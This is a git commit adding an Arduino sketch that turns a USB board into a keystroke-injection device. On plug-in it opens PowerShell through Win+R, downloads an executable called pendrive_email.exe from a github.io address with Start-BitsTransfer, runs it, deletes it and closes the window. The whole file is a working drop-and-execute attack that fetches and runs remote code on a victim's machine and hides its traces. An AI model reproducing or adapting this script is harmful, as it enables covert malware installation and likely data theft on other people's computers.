e611e8b4e823863ac5332637873f5344c3ced8b6
Adrian Frankowski <90799700+Hassagi@users.noreply.github.com>
2023-08-04 15:20:47 +0200

    Add files via upload
    new arduino file

---
+++ sketch_may11a_copy_20230604213633_copy_20230804151818.ino
@@ -0,0 +1,42 @@
+#include <Keyboard.h>
+
+void setup() {
+  // put your setup code here, to run once:
+Keyboard.begin();
+delay(2000);
+
+Keyboard.press(KEY_LEFT_GUI);
+Keyboard.press('r');
+Keyboard.releaseAll();
+delay(1000);
+
+Keyboard.print("powershell");
+Keyboard.press(KEY_RETURN);
+Keyboard.releaseAll();
+delay(1000);
+
+Keyboard.print("Start-BitsTransfer -Source https://hassagi.github.io/test/pendrive_email.exe");
+Keyboard.press(KEY_RETURN);
+Keyboard.releaseAll();
+delay(17000);
+
+Keyboard.print(".\\pendrive_email.exe");
+Keyboard.press(KEY_RETURN);
+Keyboard.releaseAll();
+delay(20000);
+
+Keyboard.print("Remove-Item -LiteralPath \".\\pendrive_email.exe\"");
+Keyboard.press(KEY_RETURN);
+Keyboard.releaseAll();
+delay(1000);
+
+Keyboard.print("exit");
+Keyboard.press(KEY_RETURN);
+Keyboard.releaseAll();
+
+}
+
+void loop() {
+  // put your main code here, to run repeatedly:
+
+}
